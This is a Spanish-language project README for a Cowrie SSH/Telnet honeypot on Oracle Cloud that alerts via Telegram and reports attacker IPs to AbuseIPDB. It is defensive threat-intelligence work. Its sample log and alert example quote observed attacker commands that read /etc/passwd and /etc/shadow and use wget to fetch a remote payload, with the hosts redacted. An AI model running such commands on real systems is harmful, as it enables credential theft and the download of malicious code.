# Honeypot SSH/Telnet en la Nube con Reporte Automático a AbuseIPDB

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python)
![Platform](https://img.shields.io/badge/Platform-Linux-orange?style=flat-square&logo=linux)
![Cloud](https://img.shields.io/badge/Cloud-Oracle%20OCI-red?style=flat-square&logo=oracle)
![Honeypot](https://img.shields.io/badge/Honeypot-Cowrie-yellow?style=flat-square)
![Community](https://img.shields.io/badge/Community-AbuseIPDB-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)

> Sistema de trampa activo en la nube que captura, analiza y reporta automáticamente amenazas reales a la comunidad global de ciberseguridad.

---

# ¿Qué hace este proyecto?

Este honeypot simula un servidor SSH/Telnet vulnerable expuesto en Internet para atraer atacantes reales. Cada intento de intrusión es **registrado, analizado y reportado automáticamente** a AbuseIPDB, contribuyendo a una base de datos global de amenazas utilizada por miles de organizaciones.

```text
Internet
    |
    v
[Atacante]──────────────────────────────────────────────┐
                                                         |
                                              ┌──────────v──────────┐
                                              |   OCI Instance      |
                                              |  ┌───────────────┐  |
                                              |  | Cowrie (SSH)  |  |
                                              |  |  Puerto 22    |  |
                                              |  └──────┬────────┘  |
                                              |         |            |
                                              |  ┌──────v────────┐  |
                                              |  |  Log Parser   |  |
                                              |  |   (Python)    |  |
                                              |  └──────┬────────┘  |
                                              └─────────┼───────────┘
                                                        |
                          ┌─────────────────────────────┼───────────────────┐
                          |                             |                   |
               ┌──────────v──────┐          ┌──────────v──────┐  ┌────────v────────┐
               |   Telegram Bot  |          |   AbuseIPDB API |  |  JSON Log File  |
               |  Alerta en      |          |  Reporte de IP  |  |  Almacenamiento |
               |  tiempo real    |          |  maliciosa      |  |  local          |
               └─────────────────┘          └─────────────────┘  └─────────────────┘
```

---

# Objetivos del Proyecto

- **Recolección de Inteligencia:** Capturar TTPs (Tácticas, Técnicas y Procedimientos) de atacantes reales
- **Contribución Comunitaria:** Reportar IPs maliciosas a AbuseIPDB
- **Alertas en Tiempo Real:** Notificación instantánea vía Telegram
- **Análisis de Patrones:** Identificar tendencias de ataque y herramientas usadas

---

# Stack Tecnológico

| Componente | Tecnología | Función |
|---|---|---|
| Honeypot | Cowrie | Simula servidor SSH/Telnet vulnerable |
| Infraestructura | Oracle Cloud (OCI) | Instancia expuesta en Internet |
| Alertas | Python + Telegram API | Notificaciones en tiempo real |
| Reporte | Python + AbuseIPDB API | Reporte automático de IPs |
| SO | Debian/Ubuntu Linux | Sistema operativo base |
| Logs | JSON + Cowrie logs | Almacenamiento de eventos |

---

# Arquitectura de Infraestructura

```text
Oracle Cloud Infrastructure (OCI)
┌─────────────────────────────────────┐
|  Virtual Cloud Network (VCN)        |
|  ┌───────────────────────────────┐  |
|  |  Compute Instance (VM)        |  |
|  |  ┌─────────────────────────┐  |  |
|  |  |  Ubuntu Server          |  |  |
|  |  |  ├── Cowrie (SSH :22)   |  |  |
|  |  |  ├── Cowrie (Tel :23)   |  |  |
|  |  |  └── Python Scripts     |  |  |
|  |  └─────────────────────────┘  |  |
|  |  Security List:               |  |
|  |  ├── Ingress: 22,23           |  |
|  |  └── Egress: All              |  |
|  └───────────────────────────────┘  |
└─────────────────────────────────────┘
```

---

# Honeypot en Ejecución

Vista de Cowrie ejecutándose en la instancia OCI monitoreando conexiones SSH/Telnet en tiempo real.

<p align="center">
  <img src="./docs/screenshots/cowrie-running.png" width="500">
</p>

---

# Instalación y Configuración

## Prerrequisitos

- Cuenta en Oracle Cloud (Free Tier)
- Python 3.8+
- Bot Token de Telegram
- API Key de AbuseIPDB

---

## 1. Clonar el repositorio

```bash
git clone https://github.com/Luyi-gg/honeypot-cowrie-oci.git
cd honeypot-cowrie-oci
```

---

## 2. Instalar dependencias

```bash
pip install -r requirements.txt
```

---

## 3. Instalar y configurar Cowrie

```bash
sudo apt-get install git python3-virtualenv libssl-dev libffi-dev build-essential python3-dev

sudo adduser --disabled-password cowrie

sudo -u cowrie git clone https://github.com/cowrie/cowrie /home/cowrie/cowrie

cd /home/cowrie/cowrie

sudo -u cowrie virtualenv cowrie-env

sudo -u cowrie cowrie-env/bin/pip install -r requirements.txt
```

---

## 4. Configurar variables de entorno

```bash
cp .env.example .env
```

Editar `.env`:

```env
TELEGRAM_BOT_TOKEN=tu_token_aqui
TELEGRAM_CHAT_ID=tu_chat_id_aqui
ABUSEIPDB_API_KEY=tu_api_key_aqui
COWRIE_LOG_PATH=/home/cowrie/cowrie/var/log/cowrie/cowrie.json
```

---

## 5. Ejecutar el monitor

```bash
python3 src/monitor.py
```

---

# Estructura del Proyecto

```text
honeypot-cowrie-oci/
│
├── README.md
├── requirements.txt
├── .env.example
│
├── src/
│   ├── monitor.py
│   ├── telegram_alert.py
│   ├── abuseipdb_report.py
│   └── log_parser.py
│
├── docs/
│   ├── setup_oci.md
│   ├── setup_cowrie.md
│   ├── architecture.md
│   └── screenshots/
│       ├── cowrie-running.png
│       ├── telegram-alert.png
│       ├── abuseipdb-profile.png
│       └── sample-log.png
│
└── data/
    └── sample_logs/
```

---

# Datos Recolectados (Muestra)

Ejemplo de eventos capturados en las primeras 24 horas de operación:

```json
{
  "timestamp": "2026-05-10T03:42:17",
  "src_ip": "XX.XX.XX.XX",
  "country": "CN",
  "username": "root",
  "password": "admin123",
  "commands_executed": [
    "cat /etc/passwd",
    "wget http://[redacted]"
  ],
  "session_duration": "00:02:34"
}
```

---

## Ejemplo visual de eventos capturados

<p align="center">
  <img src="./docs/screenshots/sample-log.png" width="450">
</p>

---

# Estadísticas del Honeypot

| Métrica | Valor |
|---|---|
| IPs únicas detectadas | 2,970 |
| IPs bloqueadas | 2,702 |
| Intentos totales | 182,013 |
| Logins fallidos | 6,095 |
| Logins exitosos | 13,815 |
| Comandos ejecutados | 13,616 |

---

# Top 10 IPs con Mayor Actividad Maliciosa

| # | IP | Intentos | País |
|---|---|---|---|
| 1 | 45.85.180.143 | 59,568 | DO |
| 2 | 139.59.236.63 | 6,138 | SG |
| 3 | 87.251.64.176 | 4,574 | PL |
| 4 | 192.109.200.237 | 3,567 | NL |
| 5 | 213.209.159.154 | 3,530 | DE |
| 6 | 176.65.132.129 | 3,507 | NL |
| 7 | 176.65.132.17 | 3,203 | NL |
| 8 | 45.156.87.204 | 3,159 | NL |
| 9 | 85.11.167.2 | 2,154 | BG |
| 10 | 141.227.190.54 | 1,915 | CZ |

---

# Top 8 Países de Origen de Ataques

| # | País | IPs únicas | % del total |
|---|---|---|---|
| 🥇 1 | 🇺🇸 United States | 657 | 19.6% |
| 🥈 2 | 🇨🇳 China | 390 | 11.6% |
| 🥉 3 | 🇩🇴 Dominican Republic | 193 | 5.7% |
| 4 | 🇬🇧 United Kingdom | 133 | 4.0% |
| 5 | 🇧🇷 Brazil | 95 | 2.8% |
| 6 | 🇸🇬 Singapore | 86 | 2.6% |
| 7 | 🇭🇰 Hong Kong | 62 | 1.8% |
| 8 | 🇮🇳 India | 62 | 1.8% |

---

# Contribución a la Comunidad

Este proyecto reporta automáticamente IPs maliciosas a AbuseIPDB, una plataforma utilizada por:

- Empresas de seguridad
- Firewalls
- IDS/IPS
- Proveedores de hosting

---

## Perfil de reportes en AbuseIPDB

<p align="center">
  <img src="./docs/screenshots/abuseipdb-profile.png" width="650">
</p>

---

# Ejemplo de Alerta en Telegram

```text
[ALERTA] INTENTO DE INTRUSION DETECTADO

IP: XX.XX.XX.XX
Pais: Russia (RU)
Usuario: root
Contrasena: toor123

Comandos ejecutados:
 -- uname -a
 -- cat /etc/shadow
 -- wget http://[redacted]/payload.sh

Duracion sesion: 1m 47s

Reportado a AbuseIPDB: SI
```

---

## Captura real de alerta enviada por el bot

<p align="center">
  <img src="./docs/screenshots/telegram-alert.png" width="600">
</p>

---

# Configuración Avanzada del Honeypot

## Múltiples puertos de escucha

```ini
[ssh]
listen_port = 2222

[telnet]
listen_port = 2323
enabled = true
```

---

## Redirección de puertos con iptables

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
```

---

# Camuflaje del Honeypot (Deception)

```ini
[honeypot]
hostname = web-prod-01
banner_file = etc/banner.txt
```

```text
Ubuntu 22.04.3 LTS - Authorized access only.
All connections are monitored and recorded.
Disconnect IMMEDIATELY if you are not an authorized user.
```

---

# Lo que aprendí

- Despliegue y administración de instancias en Oracle Cloud
- Configuración y operación de honeypots SSH/Telnet con Cowrie
- Integración de APIs externas con Python
- Análisis de logs en tiempo real
- Threat Intelligence
- Hardening básico de servidores Linux

---

# Disclaimer

> Este proyecto fue desarrollado únicamente con fines educativos y de investigación en ciberseguridad. El honeypot opera en una instancia aislada y no tiene acceso a sistemas de producción ni datos sensibles.

---

# Contacto

**Luis SC**

- LinkedIn: https://linkedin.com/in/luis-angel-sc
- GitHub: https://github.com/luis-angel-sc

---

⭐ Si este proyecto te fue útil o aprendiste algo, considera darle una estrella al repositorio.